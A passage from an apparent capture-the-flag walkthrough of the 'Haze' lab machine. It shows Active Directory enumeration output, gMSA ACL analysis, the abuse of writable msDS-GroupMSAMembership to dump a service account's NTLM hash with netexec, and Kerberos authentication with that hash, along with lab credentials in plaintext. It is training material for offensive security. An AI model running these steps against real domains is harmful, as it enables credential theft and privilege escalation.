MachineAccountQuota: 10 ⢀ Parsing LDAP objects: 4% [2025-06-24T15:36:17Z INFO rusthound_ce::objects::enterpriseca] Found 11 enabled certificate templates [2025-06-24T15:36:17Z INFO rusthound_ce::json::parser] Parsing LDAP objects finished! [2025-06-24T15:36:17Z INFO rusthound_ce::json::checker] Starting checker to replace some values... [2025-06-24T15:36:17Z INFO rusthound_ce::json::checker] Checking and replacing some values finished! [2025-06-24T15:36:17Z INFO rusthound_ce::json::maker::common] 8 users parsed! [2025-06-24T15:36:17Z INFO rusthound_ce::json::maker::common] 65 groups parsed! [2025-06-24T15:36:17Z INFO rusthound_ce::json::maker::common] 1 computers parsed! [2025-06-24T15:36:17Z INFO rusthound_ce::json::maker::common] 2 ous parsed! [2025-06-24T15:36:17Z INFO rusthound_ce::json::maker::common] 3 domains parsed! [2025-06-24T15:36:17Z INFO rusthound_ce::json::maker::common] 2 gpos parsed! [2025-06-24T15:36:17Z INFO rusthound_ce::json::maker::common] 74 containers parsed! [2025-06-24T15:36:17Z INFO rusthound_ce::json::maker::common] 1 ntauthstores parsed! [2025-06-24T15:36:17Z INFO rusthound_ce::json::maker::common] 1 aiacas parsed! [2025-06-24T15:36:17Z INFO rusthound_ce::json::maker::common] 1 rootcas parsed! [2025-06-24T15:36:17Z INFO rusthound_ce::json::maker::common] 1 enterprisecas parsed! [2025-06-24T15:36:17Z INFO rusthound_ce::json::maker::common] 33 certtemplates parsed! [2025-06-24T15:36:17Z INFO rusthound_ce::json::maker::common] 3 issuancepolicies parsed! [2025-06-24T15:36:17Z INFO rusthound_ce::json::maker::common] .//20250624153617_haze-htb_rusthound-ce.zip created! RustHound-CE Enumeration Completed at 15:36:17 on 06/24/25! Happy Graphing! </span></code></pre></div></div> <p>With the new data uploaded, the unknown group is Domain Users:</p> <picture> <source type="image/webp" srcset="/img/image-20250624114146278.webp" /> <img loading="lazy" src="/img/image-20250624114146278.png" alt="image-20250624114146278" class="include_image " /> </picture> <p>Still nothing else interesting for paul.taylor. I’ll mark mark.adams as owned, and look at their outbound control, but it shows the same:</p> <picture> <source type="image/webp" srcset="/img/image-20250624114832838.webp" /> <img loading="lazy" src="/img/image-20250624114832838.png" alt="image-20250624114832838" class="include_image " /> </picture> <p>I’ll look at mark.adams’ groups, and there are more than paul.taylor:</p> <picture> <source type="image/webp" srcset="/img/image-20250624114909855.webp" /> <img loading="lazy" src="/img/image-20250624114909855.png" alt="image-20250624114909855" class="include_image " /> </picture> <p>Remote Management Users isn’t surprising, as it’s how mark.adams is able to connect with WinRM. gMSA_Managers is interesting. It’s a non-standard group. Bloodhound isn’t showing it having any permissions.</p> <h4 id="gmsa-enumeration">gMSA Enumeration</h4> <p>Bloodhound isn’t showing anything, but this group name has to mean something. gMSA (group managed service accounts) are accounts that have crazy strong passwords managed by the domain that are retrievable by given users.</p> <p>I’ll start by looking for service accounts:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">evil-winrm-py PS C:\&gt;</span><span class="w"> </span><span class="n">Get-ADServiceAccount</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="go"> DistinguishedName : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb Enabled : True Name : Haze-IT-Backup ObjectClass : msDS-GroupManagedServiceAccount ObjectGUID : 66f8d593-2f0b-4a56-95b4-01b326c7a780 SamAccountName : Haze-IT-Backup$ SID : S-1-5-21-323145914-28650650-2368316563-1111 UserPrincipalName : </span></code></pre></div></div> <p>There’s one. The <code class="language-plaintext highlighter-rouge">ObjectClass</code> says it’s a gMSA account. I’ll look at what users can read the password:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">evil-winrm-py PS C:\&gt;</span><span class="w"> </span><span class="n">Get-ADServiceAccount</span><span class="w"> </span><span class="nx">Haze-IT-Backup</span><span class="w"> </span><span class="nt">-Property</span><span class="w"> </span><span class="nx">PrincipalsAllowedToRetrieveManagedPassword</span><span class="w"> </span><span class="go"> DistinguishedName : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb Enabled : True Name : Haze-IT-Backup ObjectClass : msDS-GroupManagedServiceAccount ObjectGUID : 66f8d593-2f0b-4a56-95b4-01b326c7a780 PrincipalsAllowedToRetrieveManagedPassword : {CN=Domain Admins,CN=Users,DC=haze,DC=htb} SamAccountName : Haze-IT-Backup$ SID : S-1-5-21-323145914-28650650-2368316563-1111 UserPrincipalName : </span></code></pre></div></div> <p>It shows only Domain Admins group.</p> <p>I’ll take a closer look at the ACLs for Haze-IT-Backup$:</p> <div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">evil-winrm-py PS C:\&gt;</span><span class="w"> </span><span class="nv">$backupuser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-ADServiceAccount</span><span class="w"> </span><span class="nx">Haze-IT-Backup</span><span class="w"> </span><span class="gp">evil-winrm-py PS C:\&gt;</span><span class="w"> </span><span class="p">(</span><span class="n">Get-Acl</span><span class="w"> </span><span class="s2">"AD:\</span><span class="si">$(</span><span class="nv">$backupuser</span><span class="o">.</span><span class="nf">DistinguishedName</span><span class="si">)</span><span class="s2">"</span><span class="p">)</span><span class="o">.</span><span class="nf">Access</span><span class="w"> </span><span class="go"> ActiveDirectoryRights : ExtendedRight InheritanceType : None ObjectType : 00299570-246d-11d0-a768-00aa006e0529 InheritedObjectType : 00000000-0000-0000-0000-000000000000 ObjectFlags : ObjectAceTypePresent AccessControlType : Deny IdentityReference : Everyone IsInherited : False InheritanceFlags : None PropagationFlags : None ActiveDirectoryRights : ReadProperty InheritanceType : All ObjectType : 0e78295a-c6d3-0a40-b491-d62251ffa0a6 InheritedObjectType : 00000000-0000-0000-0000-000000000000 ObjectFlags : ObjectAceTypePresent AccessControlType : Deny IdentityReference : HAZE\paul.taylor IsInherited : False InheritanceFlags : ContainerInherit PropagationFlags : None ActiveDirectoryRights : ReadProperty InheritanceType : All ObjectType : e362ed86-b728-0842-b27d-2dea7a9df218 InheritedObjectType : 00000000-0000-0000-0000-000000000000 ObjectFlags : ObjectAceTypePresent AccessControlType : Deny IdentityReference : HAZE\paul.taylor IsInherited : False InheritanceFlags : ContainerInherit PropagationFlags : None ActiveDirectoryRights : ReadProperty InheritanceType : All ObjectType : f8758ef7-ac76-8843-a2ee-a26b4dcaf409 InheritedObjectType : 00000000-0000-0000-0000-000000000000 ObjectFlags : ObjectAceTypePresent AccessControlType : Deny IdentityReference : HAZE\paul.taylor IsInherited : False InheritanceFlags : ContainerInherit PropagationFlags : None ActiveDirectoryRights : ReadProperty InheritanceType : All ObjectType : d0d62131-2d4a-d04f-99d9-1c63646229a4 InheritedObjectType : 00000000-0000-0000-0000-000000000000 ObjectFlags : ObjectAceTypePresent AccessControlType : Deny IdentityReference : HAZE\paul.taylor IsInherited : False InheritanceFlags : ContainerInherit PropagationFlags : None ActiveDirectoryRights : GenericRead InheritanceType : None ObjectType : 00000000-0000-0000-0000-000000000000 InheritedObjectType : 00000000-0000-0000-0000-000000000000 ObjectFlags : None AccessControlType : Allow IdentityReference : NT AUTHORITY\Authenticated Users IsInherited : False InheritanceFlags : None PropagationFlags : None ActiveDirectoryRights : GenericAll InheritanceType : None ObjectType : 00000000-0000-0000-0000-000000000000 InheritedObjectType : 00000000-0000-0000-0000-000000000000 ObjectFlags : None AccessControlType : Allow IdentityReference : NT AUTHORITY\SYSTEM IsInherited : False InheritanceFlags : None PropagationFlags : None ActiveDirectoryRights : GenericAll InheritanceType : None ObjectType : 00000000-0000-0000-0000-000000000000 InheritedObjectType : 00000000-0000-0000-0000-000000000000 ObjectFlags : None AccessControlType : Allow IdentityReference : BUILTIN\Account Operators IsInherited : False InheritanceFlags : None PropagationFlags : None ActiveDirectoryRights : GenericAll InheritanceType : None ObjectType : 00000000-0000-0000-0000-000000000000 InheritedObjectType : 00000000-0000-0000-0000-000000000000 ObjectFlags : None AccessControlType : Allow IdentityReference : HAZE\Domain Admins IsInherited : False InheritanceFlags : None PropagationFlags : None ActiveDirectoryRights : ReadProperty, GenericExecute InheritanceType : None ObjectType : 00000000-0000-0000-0000-000000000000 InheritedObjectType : 00000000-0000-0000-0000-000000000000 ObjectFlags : None AccessControlType : Allow IdentityReference : HAZE\gMSA_Managers IsInherited : False InheritanceFlags : None PropagationFlags : None ActiveDirectoryRights : ReadProperty InheritanceType : None ObjectType : e362ed86-b728-0842-b27d-2dea7a9df218 InheritedObjectType : 00000000-0000-0000-0000-000000000000 ObjectFlags : ObjectAceTypePresent AccessControlType : Allow IdentityReference : Everyone IsInherited : False InheritanceFlags : None PropagationFlags : None ActiveDirectoryRights : ReadProperty, WriteProperty InheritanceType : None ObjectType : 77b5b886-944a-11d1-aebd-0000f80367c1 InheritedObjectType : 00000000-0000-0000-0000-000000000000 ObjectFlags : ObjectAceTypePresent AccessControlType : Allow IdentityReference : NT AUTHORITY\SELF IsInherited : False InheritanceFlags : None PropagationFlags : None ActiveDirectoryRights : Self InheritanceType : None ObjectType : f3a64788-5306-11d1-a9c5-0000f80367c1 InheritedObjectType : 00000000-0000-0000-0000-000000000000 ObjectFlags : ObjectAceTypePresent AccessControlType : Allow IdentityReference : NT AUTHORITY\SELF IsInherited : False InheritanceFlags : None PropagationFlags : None ActiveDirectoryRights : Self InheritanceType : None ObjectType : 72e39547-7b18-11d1-adef-00c04fd8d5cd InheritedObjectType : 00000000-0000-0000-0000-000000000000 ObjectFlags : ObjectAceTypePresent AccessControlType : Allow IdentityReference : NT AUTHORITY\SELF IsInherited : False InheritanceFlags : None PropagationFlags : None ActiveDirectoryRights : ReadProperty InheritanceType : None ObjectType : 46a9b11d-60ae-405a-b7e8-ff8a58d456d2 InheritedObjectType : 00000000-0000-0000-0000-000000000000 ObjectFlags : ObjectAceTypePresent AccessControlType : Allow IdentityReference : BUILTIN\Windows Authorization Access Group IsInherited : False InheritanceFlags : None PropagationFlags : None ActiveDirectoryRights : ReadProperty, WriteProperty InheritanceType : None ObjectType : bf967a7f-0de6-11d0-a285-00aa003049e2 InheritedObjectType : 00000000-0000-0000-0000-000000000000 ObjectFlags : ObjectAceTypePresent AccessControlType : Allow IdentityReference : HAZE\Cert Publishers IsInherited : False InheritanceFlags : None PropagationFlags : None ActiveDirectoryRights : WriteProperty InheritanceType : None ObjectType : 888eedd6-ce04-df40-b462-b8a50e41ba38 InheritedObjectType : 00000000-0000-0000-0000-000000000000 ObjectFlags : ObjectAceTypePresent AccessControlType : Allow IdentityReference : HAZE\gMSA_Managers IsInherited : False InheritanceFlags : None PropagationFlags : None ActiveDirectoryRights : ReadProperty InheritanceType : Descendents ObjectType : 4c164200-20c0-11d0-a768-00aa006e0529 InheritedObjectType : 4828cc14-1437-45bc-9b07-ad6f015e5f28 ObjectFlags : ObjectAceTypePresent, InheritedObjectAceTypePresent AccessControlType : Allow IdentityReference : BUILTIN\Pre-Windows 2000 Compatible Access IsInherited : True InheritanceFlags : ContainerInherit PropagationFlags : InheritOnly ActiveDirectoryRights : ReadProperty InheritanceType : Descendents ObjectType : 4c164200-20c0-11d0-a768-00aa006e0529 InheritedObjectType : bf967aba-0de6-11d0-a285-00aa003049e2 ObjectFlags : ObjectAceTypePresent, InheritedObjectAceTypePresent AccessControlType : Allow IdentityReference : BUILTIN\Pre-Windows 2000 Compatible Access IsInherited : True InheritanceFlags : ContainerInherit PropagationFlags : InheritOnly ActiveDirectoryRights : ReadProperty InheritanceType : Descendents ObjectType : 5f202010-79a5-11d0-9020-00c04fc2d4cf InheritedObjectType : 4828cc14-1437-45bc-9b07-ad6f015e5f28 ObjectFlags : ObjectAceTypePresent, InheritedObjectAceTypePresent AccessControlType : Allow IdentityReference : BUILTIN\Pre-Windows 2000 Compatible Access IsInherited : True InheritanceFlags : ContainerInherit PropagationFlags : InheritOnly ActiveDirectoryRights : ReadProperty InheritanceType : Descendents ObjectType : 5f202010-79a5-11d0-9020-00c04fc2d4cf InheritedObjectType : bf967aba-0de6-11d0-a285-00aa003049e2 ObjectFlags : ObjectAceTypePresent, InheritedObjectAceTypePresent AccessControlType : Allow IdentityReference : BUILTIN\Pre-Windows 2000 Compatible Access IsInherited : True InheritanceFlags : ContainerInherit PropagationFlags : InheritOnly ActiveDirectoryRights : ReadProperty InheritanceType : Descendents ObjectType : bc0ac240-79a9-11d0-9020-00c04fc2d4cf InheritedObjectType : 4828cc14-1437-45bc-9b07-ad6f015e5f28 ObjectFlags : ObjectAceTypePresent, InheritedObjectAceTypePresent AccessControlType : Allow IdentityReference : BUILTIN\Pre-Windows 2000 Compatible Access IsInherited : True InheritanceFlags : ContainerInherit PropagationFlags : InheritOnly ActiveDirectoryRights : ReadProperty InheritanceType : Descendents ObjectType : bc0ac240-79a9-11d0-9020-00c04fc2d4cf InheritedObjectType : bf967aba-0de6-11d0-a285-00aa003049e2 ObjectFlags : ObjectAceTypePresent, InheritedObjectAceTypePresent AccessControlType : Allow IdentityReference : BUILTIN\Pre-Windows 2000 Compatible Access IsInherited : True InheritanceFlags : ContainerInherit PropagationFlags : InheritOnly ActiveDirectoryRights : ReadProperty InheritanceType : Descendents ObjectType : 59ba2f42-79a2-11d0-9020-00c04fc2d3cf InheritedObjectType : 4828cc14-1437-45bc-9b07-ad6f015e5f28 ObjectFlags : ObjectAceTypePresent, InheritedObjectAceTypePresent AccessControlType : Allow IdentityReference : BUILTIN\Pre-Windows 2000 Compatible Access IsInherited : True InheritanceFlags : ContainerInherit PropagationFlags : InheritOnly ActiveDirectoryRights : ReadProperty InheritanceType : Descendents ObjectType : 59ba2f42-79a2-11d0-9020-00c04fc2d3cf InheritedObjectType : bf967aba-0de6-11d0-a285-00aa003049e2 ObjectFlags : ObjectAceTypePresent, InheritedObjectAceTypePresent AccessControlType : Allow IdentityReference : BUILTIN\Pre-Windows 2000 Compatible Access IsInherited : True InheritanceFlags : ContainerInherit PropagationFlags : InheritOnly ActiveDirectoryRights : ReadProperty InheritanceType : Descendents ObjectType : 037088f8-0ae1-11d2-b422-00a0c968f939 InheritedObjectType : 4828cc14-1437-45bc-9b07-ad6f015e5f28 ObjectFlags : ObjectAceTypePresent, InheritedObjectAceTypePresent AccessControlType : Allow IdentityReference : BUILTIN\Pre-Windows 2000 Compatible Access IsInherited : True InheritanceFlags : ContainerInherit PropagationFlags : InheritOnly ActiveDirectoryRights : ReadProperty InheritanceType : Descendents ObjectType : 037088f8-0ae1-11d2-b422-00a0c968f939 InheritedObjectType : bf967aba-0de6-11d0-a285-00aa003049e2 ObjectFlags : ObjectAceTypePresent, InheritedObjectAceTypePresent AccessControlType : Allow IdentityReference : BUILTIN\Pre-Windows 2000 Compatible Access IsInherited : True InheritanceFlags : ContainerInherit PropagationFlags : InheritOnly ActiveDirectoryRights : ReadProperty, WriteProperty InheritanceType : All ObjectType : 5b47d60f-6090-40b2-9f37-2a4de88f3063 InheritedObjectType : 00000000-0000-0000-0000-000000000000 ObjectFlags : ObjectAceTypePresent AccessControlType : Allow IdentityReference : HAZE\Key Admins IsInherited : True InheritanceFlags : ContainerInherit PropagationFlags : None ActiveDirectoryRights : ReadProperty, WriteProperty InheritanceType : All ObjectType : 5b47d60f-6090-40b2-9f37-2a4de88f3063 InheritedObjectType : 00000000-0000-0000-0000-000000000000 ObjectFlags : ObjectAceTypePresent AccessControlType : Allow IdentityReference : HAZE\Enterprise Key Admins IsInherited : True InheritanceFlags : ContainerInherit PropagationFlags : None ActiveDirectoryRights : Self InheritanceType : Descendents ObjectType : 9b026da6-0d3c-465c-8bee-5199d7165cba InheritedObjectType : bf967a86-0de6-11d0-a285-00aa003049e2 ObjectFlags : ObjectAceTypePresent, InheritedObjectAceTypePresent AccessControlType : Allow IdentityReference : CREATOR OWNER IsInherited : True InheritanceFlags : ContainerInherit PropagationFlags : InheritOnly ActiveDirectoryRights : Self InheritanceType : Descendents ObjectType : 9b026da6-0d3c-465c-8bee-5199d7165cba InheritedObjectType : bf967a86-0de6-11d0-a285-00aa003049e2 ObjectFlags : ObjectAceTypePresent, InheritedObjectAceTypePresent AccessControlType : Allow IdentityReference : NT AUTHORITY\SELF IsInherited : True InheritanceFlags : ContainerInherit PropagationFlags : InheritOnly ActiveDirectoryRights : ReadProperty InheritanceType : Descendents ObjectType : b7c69e6d-2cc7-11d2-854e-00a0c983f608 InheritedObjectType : bf967a86-0de6-11d0-a285-00aa003049e2 ObjectFlags : ObjectAceTypePresent, InheritedObjectAceTypePresent AccessControlType : Allow IdentityReference : NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS IsInherited : True InheritanceFlags : ContainerInherit PropagationFlags : InheritOnly ActiveDirectoryRights : ReadProperty InheritanceType : Descendents ObjectType : b7c69e6d-2cc7-11d2-854e-00a0c983f608 InheritedObjectType : bf967a9c-0de6-11d0-a285-00aa003049e2 ObjectFlags : ObjectAceTypePresent, InheritedObjectAceTypePresent AccessControlType : Allow IdentityReference : NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS IsInherited : True InheritanceFlags : ContainerInherit PropagationFlags : InheritOnly ActiveDirectoryRights : ReadProperty InheritanceType : Descendents ObjectType : b7c69e6d-2cc7-11d2-854e-00a0c983f608 InheritedObjectType : bf967aba-0de6-11d0-a285-00aa003049e2 ObjectFlags : ObjectAceTypePresent, InheritedObjectAceTypePresent AccessControlType : Allow IdentityReference : NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS IsInherited : True InheritanceFlags : ContainerInherit PropagationFlags : InheritOnly ActiveDirectoryRights : WriteProperty InheritanceType : Descendents ObjectType : ea1b7b93-5e48-46d5-bc6c-4df4fda78a35 InheritedObjectType : bf967a86-0de6-11d0-a285-00aa003049e2 ObjectFlags : ObjectAceTypePresent, InheritedObjectAceTypePresent AccessControlType : Allow IdentityReference : NT AUTHORITY\SELF IsInherited : True InheritanceFlags : ContainerInherit PropagationFlags : InheritOnly ActiveDirectoryRights : GenericRead InheritanceType : Descendents ObjectType : 00000000-0000-0000-0000-000000000000 InheritedObjectType : 4828cc14-1437-45bc-9b07-ad6f015e5f28 ObjectFlags : InheritedObjectAceTypePresent AccessControlType : Allow IdentityReference : BUILTIN\Pre-Windows 2000 Compatible Access IsInherited : True InheritanceFlags : ContainerInherit PropagationFlags : InheritOnly ActiveDirectoryRights : GenericRead InheritanceType : Descendents ObjectType : 00000000-0000-0000-0000-000000000000 InheritedObjectType : bf967a9c-0de6-11d0-a285-00aa003049e2 ObjectFlags : InheritedObjectAceTypePresent AccessControlType : Allow IdentityReference : BUILTIN\Pre-Windows 2000 Compatible Access IsInherited : True InheritanceFlags : ContainerInherit PropagationFlags : InheritOnly ActiveDirectoryRights : GenericRead InheritanceType : Descendents ObjectType : 00000000-0000-0000-0000-000000000000 InheritedObjectType : bf967aba-0de6-11d0-a285-00aa003049e2 ObjectFlags : InheritedObjectAceTypePresent AccessControlType : Allow IdentityReference : BUILTIN\Pre-Windows 2000 Compatible Access IsInherited : True InheritanceFlags : ContainerInherit PropagationFlags : InheritOnly ActiveDirectoryRights : ReadProperty, WriteProperty InheritanceType : All ObjectType : 3f78c3e5-f79a-46bd-a0b8-9d18116ddc79 InheritedObjectType : 00000000-0000-0000-0000-000000000000 ObjectFlags : ObjectAceTypePresent AccessControlType : Allow IdentityReference : NT AUTHORITY\SELF IsInherited : True InheritanceFlags : ContainerInherit, ObjectInherit PropagationFlags : None ActiveDirectoryRights : ReadProperty, WriteProperty, ExtendedRight InheritanceType : All ObjectType : 91e647de-d96f-4b70-9557-d63ff4f3ccd8 InheritedObjectType : 00000000-0000-0000-0000-000000000000 ObjectFlags : ObjectAceTypePresent AccessControlType : Allow IdentityReference : NT AUTHORITY\SELF IsInherited : True InheritanceFlags : ContainerInherit PropagationFlags : None ActiveDirectoryRights : GenericAll InheritanceType : All ObjectType : 00000000-0000-0000-0000-000000000000 InheritedObjectType : 00000000-0000-0000-0000-000000000000 ObjectFlags : None AccessControlType : Allow IdentityReference : HAZE\Enterprise Admins IsInherited : True InheritanceFlags : ContainerInherit PropagationFlags : None ActiveDirectoryRights : ListChildren InheritanceType : All ObjectType : 00000000-0000-0000-0000-000000000000 InheritedObjectType : 00000000-0000-0000-0000-000000000000 ObjectFlags : None AccessControlType : Allow IdentityReference : BUILTIN\Pre-Windows 2000 Compatible Access IsInherited : True InheritanceFlags : ContainerInherit PropagationFlags : None ActiveDirectoryRights : CreateChild, Self, WriteProperty, ExtendedRight, Delete, GenericRead, WriteDacl, WriteOwner InheritanceType : All ObjectType : 00000000-0000-0000-0000-000000000000 InheritedObjectType : 00000000-0000-0000-0000-000000000000 ObjectFlags : None AccessControlType : Allow IdentityReference : BUILTIN\Administrators IsInherited : True InheritanceFlags : ContainerInherit PropagationFlags : None </span></code></pre></div></div> <p>There’s a lot there, but I’ll try looking for just gMSA_Managers’ access:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">evil-winrm-py PS C:\&gt;</span><span class="w"> </span><span class="p">(</span><span class="n">Get-Acl</span><span class="w"> </span><span class="s2">"AD:\</span><span class="si">$(</span><span class="nv">$backupuser</span><span class="o">.</span><span class="nf">DistinguishedName</span><span class="si">)</span><span class="s2">"</span><span class="p">)</span><span class="o">.</span><span class="nf">Access</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">IdentityReference</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s1">'*gMSA_Manage </span><span class="go">r*' } ActiveDirectoryRights : ReadProperty, GenericExecute InheritanceType : None ObjectType : 00000000-0000-0000-0000-000000000000 InheritedObjectType : 00000000-0000-0000-0000-000000000000 ObjectFlags : None AccessControlType : Allow IdentityReference : HAZE\gMSA_Managers IsInherited : False InheritanceFlags : None PropagationFlags : None ActiveDirectoryRights : WriteProperty InheritanceType : None ObjectType : 888eedd6-ce04-df40-b462-b8a50e41ba38 InheritedObjectType : 00000000-0000-0000-0000-000000000000 ObjectFlags : ObjectAceTypePresent AccessControlType : Allow IdentityReference : HAZE\gMSA_Managers IsInherited : False InheritanceFlags : None PropagationFlags : None </span></code></pre></div></div> <p>The <code class="language-plaintext highlighter-rouge">ObjectType</code> GUID is the attribute <code class="language-plaintext highlighter-rouge">msDS-GroupMSAMembership</code> (<a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada2/c651f64d-5e92-4d12-9011-e6811ed306aa">docs</a>).</p> <h4 id="acl-identification-shortcuts">ACL Identification Shortcuts</h4> <p>After solving the box, I learned that <a href="https://github.com/CravateRouge/bloodyAD">BloodyAD</a> has a shortcut here:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>bloodyAD <span class="nt">--host</span> DC01.haze.htb <span class="nt">-d</span> haze.htb <span class="nt">-u</span> mark.adams <span class="nt">-p</span> Ld@p_Auth_Sp1unk@2k24 get writable <span class="nt">--detail</span> <span class="go"> distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=haze,DC=htb url: WRITE wWWHomePage: WRITE distinguishedName: CN=Mark Adams,CN=Users,DC=haze,DC=htb thumbnailPhoto: WRITE pager: WRITE mobile: WRITE homePhone: WRITE userSMIMECertificate: WRITE msDS-ExternalDirectoryObjectId: WRITE ...[snip]... distinguishedName: CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb msDS-GroupMSAMembership: WRITE </span></code></pre></div></div> <p>Or the <code class="language-plaintext highlighter-rouge">Find-InterestingDomainAcl</code> function in <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">evil-winrm-py PS C:\programdata&gt; </span><span class="n">upload</span><span class="w"> </span><span class="nx">/opt/PowerSploit/Recon/PowerView.ps1</span><span class="w"> </span><span class="nx">PowerView.ps1</span><span class="w"> </span><span class="go">Uploading /opt/PowerSploit/Recon/PowerView.ps1: 768kB [00:03, 262kB/s] [+] File uploaded successfully as: C:\programdata\PowerView.ps1 </span><span class="gp">evil-winrm-py PS C:\programdata&gt; </span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="n">\PowerView.ps1</span><span class="w"> </span><span class="gp">evil-winrm-py PS C:\programdata&gt; </span><span class="nx">Find-InterestingDomainAcl</span><span class="w"> </span><span class="nt">-ResolveGUIDS</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">IdentityReferenceName</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s2">"gMSA_Managers"</span><span class="p">}</span><span class="w"> </span><span class="go"> ObjectDN : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb AceQualifier : AccessAllowed ActiveDirectoryRights : WriteProperty ObjectAceType : ms-DS-GroupMSAMembership AceFlags : None AceType : AccessAllowedObject InheritanceFlags : None SecurityIdentifier : S-1-5-21-323145914-28650650-2368316563-1107 IdentityReferenceName : gMSA_Managers IdentityReferenceDomain : haze.htb IdentityReferenceDN : CN=gMSA_Managers,CN=Users,DC=haze,DC=htb IdentityReferenceClass : group </span></code></pre></div></div> <h3 id="recover-credentials">Recover Credentials</h3> <p>I’ll set the users able to retrieve the password to mark.adams:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">evil-winrm-py PS C:\&gt;</span><span class="w"> </span><span class="n">Set-ADServiceAccount</span><span class="w"> </span><span class="nx">Haze-IT-Backup</span><span class="w"> </span><span class="nt">-PrincipalsAllowedToRetrieveManagedPassword</span><span class="w"> </span><span class="s2">"mark.adams"</span><span class="w"> </span></code></pre></div></div> <p>Now I can dump the hash using <code class="language-plaintext highlighter-rouge">netexec</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec ldap dc01.haze.htb <span class="nt">-u</span> mark.adams <span class="nt">-p</span> Ld@p_Auth_Sp1unk@2k24 <span class="nt">--gmsa</span> <span class="netexec-protocol">LDAP </span><span class="go"> 10.10.11.61 389 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb) (signing:None) (channel binding:Never) </span><span class="netexec-protocol">LDAP </span><span class="go"> 10.10.11.61 389 DC01 </span><span class="netexec-logsuccess">[+]</span><span class="go"> haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24 </span><span class="netexec-protocol">LDAP </span><span class="go"> 10.10.11.61 389 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Getting GMSA Passwords </span><span class="netexec-protocol">LDAP </span><span class="go"> 10.10.11.61 389 DC01 Account: Haze-IT-Backup$ NTLM: 4de830d1d58c14e241aff55f82ecdba1 PrincipalsAllowedToReadPassword: mark.adams </span></code></pre></div></div> <p>It won’t work over NTLM auth:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb dc01.haze.htb <span class="nt">-u</span> Haze-IT-Backup <span class="nt">-H</span> 4de830d1d58c14e241aff55f82ecdba1 <span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logfail">[-]</span><span class="go"> haze.htb\Haze-IT-Backup:4de830d1d58c14e241aff55f82ecdba1 STATUS_LOGON_FAILURE </span></code></pre></div></div> <p>That’s because it’s a service account. It will work using Kerberos by adding <code class="language-plaintext highlighter-rouge">-k</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb dc01.haze.htb <span class="nt">-u</span> Haze-IT-Backup <span class="nt">-H</span> 4de830d1d58c14e241aff55f82ecdba1 <span class="nt">-k</span> <span class="netexec-protocol">SMB </span><span class="go"> dc01.haze.htb 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> dc01.haze.htb 445 DC01 </span><span class="netexec-logsuccess">[+]</span><span class="go"> haze.htb\Haze-IT-Backup:4de830d1d58c14e241aff55f82ecdba1 </span></code></pre></div></div> <h2 id="shell-as-edwardmartin">Shell as edward.martin</h2> <h3 id="enumeration-2">Enumeration</h3> <p>Haze-IT-Backups has <code class="language-plaintext highlighter-rouge">WriteOwner</code> over the Support Services group:</p> <picture> <source type="image/webp" srcset="/img/image-20250624124133312.webp" /> <img loading="lazy" src="/img/image-20250624124133312.png" alt="image-20250624124133312" class="include_image " /> </picture> <p>From my current visibility, Support_Services has no members and no outbound control.</p> <h3 id="control-support_services">Control Support_Services</h3> <p>With nowhere else to look, I’ll try adding a user I control to the Support_Services group. I’ll get a TGT for the service account:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span>getTGT.py haze.htb/Haze-IT-Backup<span class="se">\$</span> <span 